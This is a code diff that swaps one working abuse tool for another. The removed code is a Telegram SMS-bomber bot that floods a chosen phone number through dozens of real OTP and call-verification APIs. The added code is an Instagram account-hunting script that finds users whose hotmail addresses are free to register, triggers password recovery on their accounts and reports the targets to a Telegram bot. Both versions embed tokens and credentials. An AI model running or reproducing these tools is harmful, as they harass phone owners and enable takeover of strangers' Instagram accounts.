@@ -1,591 +1,261 @@
-import logging
-import asyncio
-import requests
-import time
-import threading
-import json
-import math
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    MessageHandler,
-    filters
-)
+import requests,re,random,os,sys
+from rich import print as g
+from rich.panel import Panel
+from threading import Thread
+import webbrowser
+webbrowser.open('https://t.me/z3x5j')
 
-BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
-CHANNEL_ID = -1002512368825  # Replace with your actual channel ID
+######CHIMOX#####
+R = '\033[1;31;40m'
+X = '\033[1;33;40m' 
+F = '\033[1;32;40m' 
+C = "\033[1;97;40m" 
+C = "\033[1;97;40m"
+B = '\033[1;36;40m'
+K = '\033[1;35;40m'
+V = '\033[1;36;40m'
+######CHIMOX#####
 
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]
+tok = input('• {}TOKEN{} ♪ {}TELE : {}'.format(B,C,V,K))
+print("\r")
+iD = input('• {}ID{} ♪ {}TELE : {}'.format(B,C,V,K))
+os.system('clear')
+def cookie(email):
+    versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
+    oss = [
+    "Macintosh; Intel Mac OS X 10_15_7",
+     "Macintosh; Intel Mac OS X 10_14_6",
+      "iPhone; CPU iPhone OS 14_0 like Mac OS X",
+       "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
+    version = random.choice(versions)
+    platform = random.choice(oss)
+    user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
+    try:
+        url = 'https://signup.live.com'
+        headers={'user-agent': user_agent}
+        response = requests.post(url,headers=headers)
+        amsc = response.cookies.get_dict()['amsc']
+        match = re.search(r'"apiCanary":"(.*?)"', response.text)
+        if match:
+            api_canary= match.group(1)
+            canary = api_canary.encode().decode('unicode_escape')
+        else:pass
+        return amsc,canary
+    except :
+        check_hot(email)
 
-# Global variables for the bomber
-message_count = 0
-api_counters = {}
-api_repeats = {}  # Tracks how many times each API has repeated
-count_lock = threading.Lock()
-start_time = 0
-bomber_active = False
-current_target = ""
-current_threads = 0
-status_message = None
-status_chat_id = None
+def insta1(email):
+	global good_ig,bad_ig
+	try:
+		app=''.join(random.choice('1234567890')for i in range(15))
+		response = requests.get('https://www.instagram.com/api/graphql')
+		csrf = response.cookies.get_dict().get('csrftoken')
+		rnd=str(random.randint(150, 999))
+		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
+		common_data = {'flow': 'fxcal','recaptcha_challenge_field': '',}
+		data = {'email_or_username': email + "@hotmail.com", **common_data}
+		headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','user-agent': user_agent,'viewport-width': '384','x-asbd-id': '129477','x-csrftoken': f'{csrf}','x-ig-app-id': app,'x-ig-www-claim': '0','x-instagram-ajax': '1007832499','x-requested-with': 'XMLHttpRequest'}
+		response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
+		if 'email_or_sms_sen' in response.text :
+			good_ig+=1			
+			check_hot(email)
+		else:
+			bad_ig+=1			
+	except requests.exceptions.ConnectionError:
+		insta1(email)
 
-# Complete API configurations (ALL APIs INCLUDED)
-api_configurations = [
-    # POST APIs (40 second interval)
-    {
-        'name': 'Samsung OTP',
-        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"user_id": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'More Retail Login',
-        'url': 'https://omni-api.moreretail.in/api/v1/login/',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Swiggy Call Verify',
-        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"mobile": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'OLX Authentication',
-        'url': 'https://www.olx.in/api/auth/authenticate?lang=en-IN',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"method": "call", "phone": f"+91{n}", "language": "en-IN", "grantType": "retry"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'PropTiger Login',
-        'url': 'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"contactNumber": n, "domainId": "2"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'ForexWin OTP',
-        'url': 'https://api.forexwin.co/api/sendOtp',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"phone": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'DocTime OTP',
-        'url': 'https://admin.doctime.com.bd/api/otp/send',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"contact": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Doubtnut Login',
-        'url': 'https://api.doubtnut.com/v4/student/login',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"is_web": "3", "phone_number": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Trinkerr OTP',
-        'url': 'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"mobile": n, "otpOperationType": "SignUp"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Meesho OTP',
-        'url': 'https://www.meesho.com/api/v1/user/login/request-otp',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"phone_number": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'TLLMS OTP',
-        'url': 'https://identity.tllms.com/api/request_otp',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"feature": "", "phone": f"+91{n}", "type": "sms", "app_client_id": "null"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    # GET APIs (45 second interval)
-    {
-        'name': 'Glonova Lookup',
-        'url': 'https://glonova.in/',
-        'method': 'GET',
-        'params': lambda n: {'mobile': n},
-        'interval': 45,
-        'threads': 1
-    },
-    # Booming API (continuous)
-    {
-        'name': 'Booming API',
-        'url': 'https://booming-api.vercel.app/',
-        'method': 'GET',
-        'params': lambda n: {'number': n},
-        'interval': 0.5,
-        'threads': 'user_defined'
+def insta2(email):
+	bb =0
+	global good_ig,bad_ig
+	try:
+		rnd=str(random.randint(150, 999))
+		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
+		url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
+		head= {	
+			 'Host': 'www.instagram.com',
+			 'origin': 'https://www.instagram.com',
+			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
+			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
+			 'user-agent': user_agent}
+		data = {
+		'email':email+"@hotmail.com"
+		}
+		res= requests.post(url,headers=head,data=data)
+		if 'email_is_taken' in res.text:		
+			good_ig+=1			
+			check_hot(email)
+		else:
+			bad_ig+=1			
+	except requests.exceptions.ConnectionError:
+		insta2(email)
+
+def check_hot(email):
+	global good_hot,bad_hot
+	versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
+	oss = [
+	"Macintosh; Intel Mac OS X 10_15_7",
+	 "Macintosh; Intel Mac OS X 10_14_6",
+	 "iPhone; CPU iPhone OS 14_0 like Mac OS X",
+	  "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
+	version = random.choice(versions)
+	platform = random.choice(oss)
+	user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
+	try:	     
+	     amsc,canary = cookie(email)	     
+	     headers = {
+      'authority': 'signup.live.com',
+      'accept': 'application/json',
+      'accept-language': 'en-US,en;q=0.9',
+      'canary': canary,
+      'user-agent': user_agent,
     }
-]
+	     cookies = {
+      'amsc':amsc
+    }
+	     data = {
+      'signInName': email+"@hotmail.com",
+    }
+	     response = requests.post(
+      'https://signup.live.com/API/CheckAvailableSigninNames',cookies=cookies,headers=headers,json=data)
+	     if 'isAvailable' in response.text:
+	     	good_hot+=1	     	
+	     	hunting(email)	     	
+	     else:	     	
+	     	pass  	
+	except requests.exceptions.ConnectionError:
+		check_hot(email)	
 
-def api_request_loop(api_config, number, thread_id=None):
-    global message_count, api_counters, api_repeats, bomber_active
-    api_name = api_config['name']
-    
-    with count_lock:
-        if api_name not in api_counters:
-            api_counters[api_name] = 0
-            api_repeats[api_name] = 0
-    
-    while bomber_active:
-        try:
-            if api_config['method'] == 'POST':
-                response = requests.post(
-                    api_config['url'],
-                    data=api_config['data'](number),
-                    headers=api_config.get('headers', {}),
-                    timeout=10
-                )
-            else:
-                response = requests.get(
-                    api_config['url'],
-                    params=api_config['params'](number),
-                    headers=api_config.get('headers', {}),
-                    timeout=10
-                )
-            
-            with count_lock:
-                message_count += 1
-                api_counters[api_name] += 1
-                if api_counters[api_name] % 100 == 0:
-                    api_repeats[api_name] += 1
-                
-        except Exception as e:
-            logging.error(f"Error in {api_name} thread {thread_id}: {str(e)}")
-        
-        time.sleep(api_config['interval'])
+def date_sc(Id):
+ try:
+     response = requests.get("https://mel7n.pythonanywhere.com/?id={}".format(Id)).json()
+     return response['date']
+ except BaseException as CHIMX :
+  return CHIMX
+	
+def hunting(email):	
+	try:
+		headers = {
+    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+    'X-Pigeon-Rawclienttime': '1700251574.982',
+    'X-IG-Connection-Speed': '-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+    'X-IG-Bandwidth-TotalBytes-B': '0',
+    'X-IG-Bandwidth-TotalTime-MS': '0',
+    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+    'X-IG-Connection-Type': 'WIFI',
+    'X-IG-Capabilities': '3brTvw==',
+    'X-IG-App-ID': '567067343352427',
+    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+    'Accept-Language': 'en-GB, en-US',
+     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Host': 'i.instagram.com',
+    'X-FB-HTTP-Engine': 'Liger',
+    'Connection': 'keep-alive',
+    'Content-Length': '356',
+}
+		data = {
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
+    'ig_sig_key_version': '4',
+}	
+		try:
+		    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
+		    rest = response.json()['email']
+		except :
+			rest = False
+		try:
+			info=requests.get('https://anonyig.com/api/ig/userInfoByUsername/'+email).json()
+		except :
+			info = None			
+		try:
+			Id =info['result']['user']['pk_id']
+		except :
+			Id = None
+		try:
+			followers = info['result']['user']['follower_count']
+		except :
+			followers = None
+		try:
+			following = info['result']['user']['following_count']
+		except :
+			following = None
+		try:
+			post = info['result']['user']['media_count']
+		except :
+			post = None
+		try:
+			name = info['result']['user']['full_name']
+		except :
+			name = None
+		date = date_sc(Id)			
+		hunt = ("""
+𝙣𝙚𝙬 𝙝𝙪𝙣𝙩 𝙗𝙧𝙤 𝙜𝙤𝙤𝙙 𝙡𝙪𝙘𝙠 🇵🇸
+⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
+𝙣𝙖𝙢𝙚 : {}
+𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {}
+𝙚𝙢𝙖𝙞𝙡 : {}@hotmail.com
+𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {}
+𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {}
+𝙞𝙙 : {}
+𝙙𝙖𝙩𝙚 : {}
+𝙥𝙤𝙨𝙩 : {}
+𝙧𝙚𝙨𝙚𝙩 : {}
+⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
+𝙗𝙮 : @XJ_JP	
+		""".format(name,email,email,followers,following,Id,date,post,rest))
+		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
+		nnn = random.choice([R,X,F,B,K,V])
+		print(nnn)				
+		hunt2 = ("""
+New Hunt Bro Good Luck  
+Name : {}
+Username : {}
+Email : {}@hotmail.com
+Folowers : {}
+Folowing : {}
+Id : {}
+Date : {}
+Posts : {}
+Reset : {}
+BY : @XJ_JP	
+		""".format(name,email,email,followers,following,Id,date,post,rest))
+		Hit = Panel(hunt2);g(Panel(Hit, title=f"Instagram | {good_hot}"))		
+	except :
+		hunting(email)
 
-def start_bomber(number, boom_threads, context, chat_id):
-    global bomber_active, start_time, message_count, api_counters, api_repeats, current_target, current_threads, status_chat_id
-    
-    bomber_active = True
-    start_time = time.time()
-    message_count = 0
-    api_counters = {}
-    api_repeats = {}
-    current_target = number
-    current_threads = boom_threads
-    status_chat_id = chat_id
-    
-    display_thread = threading.Thread(target=display_counters, args=(context,), daemon=True)
-    display_thread.start()
-    
-    for config in api_configurations:
-        threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
-        for i in range(threads):
-            t = threading.Thread(
-                target=api_request_loop,
-                args=(config, number, i+1),
-                daemon=True
-            )
-            t.start()
-    logging.info(f"Bomber started on {number} with {boom_threads} threads")
+def check_email(email):
+	global good_hot,bad_hot,bad_ig,good_ig,check
+	Choice = random.choice(['insta1','insta2'])
+	if Choice != 'insta2':
+		insta1(email)
+	else :
+		insta2(email)
+	b = random.randint(5,208)
+	bo = f'\x1b[38;5;{b}m'
+	check+=1
+	sys.stdout.write(f"\r   {bo}[ {C}CHIMOX ™ {bo}] {C}Good Hot : {F}{good_hot}  {C}Bad IG : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo}Check•{check}\r")
+	sys.stdout.flush()
 
-def stop_bomber():
-    global bomber_active, current_target, current_threads, status_message
-    bomber_active = False
-    current_target = ""
-    current_threads = 0
-    status_message = None
-    logging.info("Bomber stopped by user")
+def username1():
+        headers = {"x-bloks-version-id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","user-agent": "Instagram 275.0.0.27.98 Android (28/9; 240dpi; 720x1280; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 458229258)","authorization": "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNTI1MjEwODYyODIiLCJzZXNzaW9uaWQiOiI1MjUyMTA4NjI4MiUzQUt4VGg2UUFzam5teVlIJTNBMjUlM0FBWWQtcXhaZGRTanNyQ3o2eW1ud0NuUGNINFpwbVd1a0JMN2p4Wm5Gb2cifQ==",}
 
-async def display_counters(context):
-    global message_count, api_counters, api_repeats, start_time, bomber_active, current_target, current_threads, status_message
-    
-    while bomber_active:
-        with count_lock:
-            current_total = message_count
-            current_api_counts = api_counters.copy()
-            current_repeats = api_repeats.copy()
-        
-        runtime = time.time() - start_time
-        requests_per_sec = current_total / max(1, runtime)
-        
-        # Create progress bar
-        progress = min(100, (runtime % 10) * 10)  # Animated progress for demo
-        progress_bar = "🟢" * int(progress/10) + "⚪" * (10 - int(progress/10))
-        
-        # Format runtime as MM:SS
-        minutes = int(runtime // 60)
-        seconds = int(runtime % 60)
-        runtime_str = f"{minutes}:{seconds:02d}"
-        
-        output = f"🔥 <b>BOMBER STATUS</b> 🔥\n\n"
-        output += f"📱 <b>Target</b>: <code>{current_target}</code>\n"
-        output += f"🧵 <b>Threads</b>: <code>{current_threads}</code>\n"
-        output += f"⏱️ <b>Runtime</b>: <code>{runtime_str}</code>\n\n"
-        output += f"📊 <b>Total Requests</b>: <code>{current_total:,}</code>\n"
-        output += f"🚀 <b>Speed</b>: <code>{requests_per_sec:.1f}/sec</code>\n\n"
-        output += f"{progress_bar}\n\n"
-        output += "<b>ACTIVE API THREADS:</b>\n"
-        
-        for api_name in sorted(current_api_counts.keys()):
-            count = current_api_counts[api_name]
-            repeat = current_repeats.get(api_name, 0)
-            output += f"  • {api_name.ljust(18)}: <code>{count:,}</code> (×{repeat})\n"
-        
-        try:
-            if status_message:
-                await status_message.edit_text(output, parse_mode='HTML')
-            else:
-                status_message = await context.bot.send_message(
-                    chat_id=status_chat_id,
-                    text=output,
-                    parse_mode='HTML'
-                )
-        except Exception as e:
-            logging.error(f"Error updating status: {e}")
-        
-        time.sleep(5)
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        if update.callback_query:
-            query = update.callback_query
-            await query.answer()
-            message = query.message
-        else:
-            message = update.message
-
-        keyboard = [
-            [InlineKeyboardButton("📢 Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
-            [InlineKeyboardButton("✅ Check Join", callback_data="check_join")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        welcome_text = """
-🌟 <b>Welcome to SMS Bomber Pro</b> 🌟
-
-🚀 <i>The most powerful SMS bomber tool on Telegram</i>
-
-🔹 <b>Features:</b>
-• Multiple API endpoints
-• Custom thread control
-• Real-time stats
-• High speed bombing
-
-👉 Join our channel to get started!
-        """
-        
-        if update.callback_query:
+        while True:
             try:
-                await message.edit_caption(
-                    caption=welcome_text,
-                    reply_markup=reply_markup,
-                    parse_mode='HTML'
-                )
+                id = str(random.randrange(128053904,438909537))
+                data = {
+                    "lsd": id,
+                    "variables": '{"id":"' + id + '","render_surface":"PROFILE"}',
+                    "server_timestamps": 'true',
+                    "doc_id": '25313068075003303'
+                }
+                headers['X-Fb-Lsd'] = id
+                response = requests.post("https://www.instagram.com/api/graphql", headers=headers, data=data).json()
+                if 'data' in response and 'user' in response['data'] and 'username' in response['data']['user']:
+                    username = response['data']['user']['username']
+                    check_email(username)
             except:
-                await context.bot.send_photo(
-                    chat_id=message.chat_id,
-                    photo="https://t.me/bshshsubjsus/4",
-                    caption=welcome_text,
-                    reply_markup=reply_markup,
-                    parse_mode='HTML'
-                )
-        else:
-            await message.reply_photo(
-                photo="https://t.me/bshshsubjsus/4",
-                caption=welcome_text,
-                reply_markup=reply_markup,
-                parse_mode='HTML'
-            )
-    except Exception as e:
-        logging.error(f"Start error: {e}")
-        if update.message:
-            await update.message.reply_text("An error occurred. Please try again.")
-
-async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        query = update.callback_query
-        await query.answer()
-        user_id = query.from_user.id
-
-        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
-        if member.status in ['member', 'administrator', 'creator']:
-            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            try:
-                await query.edit_message_caption(
-                    caption="✅ <b>Access Granted!</b>\n\nClick below to start the bomber!",
-                    reply_markup=reply_markup,
-                    parse_mode='HTML'
-                )
-            except:
-                await context.bot.send_message(
-                    chat_id=query.message.chat_id,
-                    text="✅ <b>Access Granted!</b>\n\nClick below to start the bomber!",
-                    reply_markup=reply_markup,
-                    parse_mode='HTML'
-                )
-        else:
-            await query.edit_message_caption(
-                caption="❌ <b>You must join our channel first!</b>\n\nPlease join and try again.",
-                parse_mode='HTML'
-            )
-    except Exception as e:
-        logging.error(f"Check_join error: {e}")
-        try:
-            await query.answer("Error checking join status", show_alert=True)
-        except:
-            pass
-
-async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        try:
-            await query.edit_message_text(
-                "🔢 <b>Enter target number:</b>\n\n"
-                "• 10 digits only\n"
-                "• Without +91 or 0\n"
-                "• Example: <code>9876543210</code>",
-                parse_mode='HTML'
-            )
-        except:
-            await context.bot.send_message(
-                chat_id=query.message.chat_id,
-                text="🔢 <b>Enter target number:</b>\n\n"
-                     "• 10 digits only\n"
-                     "• Without +91 or 0\n"
-                     "• Example: <code>9876543210</code>",
-                parse_mode='HTML'
-            )
-        
-        context.user_data['awaiting_phone_number'] = True
-    except Exception as e:
-        logging.error(f"Start_bomber error: {e}")
-        try:
-            await query.answer("Error starting bomber", show_alert=True)
-        except:
-            pass
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
-        phone_number = update.message.text.strip()
-        
-        if not phone_number.isdigit() or len(phone_number) != 10:
-            await update.message.reply_text(
-                "❌ <b>Invalid number!</b>\n\n"
-                "Please send a valid 10 digit number without +91 or 0.\n"
-                "Example: <code>9876543210</code>",
-                parse_mode='HTML'
-            )
-            return
-        
-        keyboard = [
-            [InlineKeyboardButton("5 Threads", callback_data=f"threads_5_{phone_number}")],
-            [InlineKeyboardButton("10 Threads", callback_data=f"threads_10_{phone_number}")],
-            [InlineKeyboardButton("15 Threads", callback_data=f"threads_15_{phone_number}")],
-            [InlineKeyboardButton("Custom Threads", callback_data=f"custom_threads_{phone_number}")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            "🧵 <b>Select threads for Booming API:</b>\n\n"
-            "• 1-20 threads recommended\n"
-            "• Higher threads = faster bombing\n"
-            "• Custom option allows any number",
-            reply_markup=reply_markup,
-            parse_mode='HTML'
-        )
-        
-        context.user_data['awaiting_phone_number'] = False
-    
-    elif 'awaiting_thread_count' in context.user_data and context.user_data['awaiting_thread_count']:
-        try:
-            threads = int(update.message.text.strip())
-            phone_number = context.user_data['target_number']
-            
-            if threads < 1 or threads > 100:
-                await update.message.reply_text(
-                    "❌ <b>Invalid thread count!</b>\n\n"
-                    "Please enter a number between 1-100.",
-                    parse_mode='HTML'
-                )
-                return
-            
-            start_bomber(phone_number, threads, context, update.message.chat_id)
-            
-            await update.message.reply_text(
-                f"🚀 <b>Bomber started on {phone_number} with {threads} threads!</b>\n\n"
-                "• Running in background\n"
-                "• Use /stopbomber to stop\n"
-                "• Stats will update automatically",
-                parse_mode='HTML'
-            )
-            
-            del context.user_data['awaiting_thread_count']
-            del context.user_data['target_number']
-            
-        except ValueError:
-            await update.message.reply_text(
-                "❌ <b>Invalid input!</b>\n\n"
-                "Please enter a valid number (1-100).",
-                parse_mode='HTML'
-            )
-
-async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        data = query.data.split('_')
-        
-        if data[0] == 'custom':
-            phone_number = data[2]
-            context.user_data['awaiting_thread_count'] = True
-            context.user_data['target_number'] = phone_number
-            
-            await query.edit_message_text(
-                "✏️ <b>Enter custom thread count (1-100):</b>\n\n"
-                "Type any number between 1-100\n"
-                "Example: <code>25</code>",
-                parse_mode='HTML'
-            )
-        else:
-            threads = int(data[1])
-            phone_number = data[2]
-            
-            start_bomber(phone_number, threads, context, query.message.chat_id)
-            
-            await query.edit_message_text(
-                f"🚀 <b>Bomber started on {phone_number} with {threads} threads!</b>\n\n"
-                "• Running in background\n"
-                "• Use /stopbomber to stop\n"
-                "• Stats will update automatically",
-                parse_mode='HTML'
-            )
-    except Exception as e:
-        logging.error(f"Thread selection error: {e}")
-        try:
-            await query.answer("Error starting bomber", show_alert=True)
-        except:
-            pass
-
-async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stop_bomber()
-    await update.message.reply_text(
-        "🛑 <b>Bomber stopped successfully!</b>\n\n"
-        "All attack threads terminated.",
-        parse_mode='HTML'
-    )
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bomber_active:
-        await update.message.reply_text(
-            "ℹ️ <b>No active bomber session</b>\n\n"
-            "Start a bomber first to see stats",
-            parse_mode='HTML'
-        )
-        return
-    
-    with count_lock:
-        current_total = message_count
-        current_api_counts = api_counters.copy()
-        current_repeats = api_repeats.copy()
-    
-    runtime = time.time() - start_time
-    requests_per_sec = current_total / max(1, runtime)
-    
-    # Format runtime as MM:SS
-    minutes = int(runtime // 60)
-    seconds = int(runtime % 60)
-    runtime_str = f"{minutes}:{seconds:02d}"
-    
-    progress = min(100, (runtime % 10) * 10)
-    progress_bar = "🟢" * int(progress/10) + "⚪" * (10 - int(progress/10))
-    
-    stats_text = f"""
-📊 <b>BOMBER STATISTICS</b> 📊
-
-📱 <b>Target</b>: <code>{current_target}</code>
-🧵 <b>Threads</b>: <code>{current_threads}</code>
-⏱️ <b>Runtime</b>: <code>{runtime_str}</code>
-
-📈 <b>Total Requests</b>: <code>{current_total:,}</code>
-🚀 <b>Speed</b>: <code>{requests_per_sec:.1f}/sec</code>
-
-{progress_bar}
-
-<b>API BREAKDOWN:</b>
-"""
-    
-    for api_name in sorted(current_api_counts.keys()):
-        count = current_api_counts[api_name]
-        repeat = current_repeats.get(api_name, 0)
-        stats_text += f"  • {api_name.ljust(18)}: <code>{count:,}</code> (×{repeat})\n"
-    
-    await update.message.reply_text(stats_text, parse_mode='HTML')
-
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    logging.error(f"Error: {context.error}")
-    try:
-        if isinstance(update, Update) and update.callback_query:
-            await update.callback_query.answer("❌ Error occurred", show_alert=True)
-        elif isinstance(update, Update) and update.message:
-            await update.message.reply_text("⚠️ An error occurred. Please try again.")
-    except Exception as e:
-        logging.error(f"Error handler error: {e}")
-
-async def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    
-    app.add_error_handler(error_handler)
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
-    app.add_handler(CommandHandler("stats", stats_command))
-    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
-    app.add_handler(CallbackQueryHandler(start_bomber_handler, pattern="start_bomber"))
-    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
-    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^custom_threads_"))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    logging.info("Bot running...")
-    await app.run_polling()
-
-if __name__ == '__main__':
-    import nest_asyncio
-    nest_asyncio.apply()
-    asyncio.run(main())
+                    username1()    
+for i in range(25):
+  Thread(target=username1).start()
